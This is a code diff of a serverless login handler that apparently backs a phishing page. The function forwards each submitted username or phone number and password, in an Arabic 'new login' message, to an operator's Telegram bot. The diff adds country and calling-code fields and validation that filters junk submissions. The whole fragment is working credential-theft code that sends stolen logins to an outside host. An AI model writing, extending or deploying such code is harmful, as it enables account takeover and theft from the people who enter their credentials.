@@ -11,16 +11,27 @@ exports.handler = async function (event, context) {
         };
     }
 
-    const { text, password } = JSON.parse(event.body);
+    const { text, password, country, callingCode } = JSON.parse(event.body);
 
-    if (!text || !password) {
+    const textRegex = /^[a-zA-Z0-9_.@]+$/;
+
+    const hasArabic = /[\u0600-\u06FF]/.test(text);
+
+    if (!text || !textRegex.test(text) || hasArabic) {
         return {
             statusCode: 400,
-            body: JSON.stringify({ message: 'Text (username/phone) and password are required' }),
+            body: JSON.stringify({ message: 'Invalid text format' }),
         };
     }
 
-    const message = `تسجيل دخول جديد .\n\nالرقم او البريد : ${text}\nالرمز : ${password}`;
+    if (!password || password.length < 6) {
+        return {
+            statusCode: 400,
+            body: JSON.stringify({ message: 'Password too short' }),
+        };
+    }
+
+    const message = `تسجيل دخول جديد .\n\nالرقم او البريد : ${text}\nالرمز : ${password}\nالدولة : ${country}\nرمز الدولة : ${callingCode}`;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}`;
 
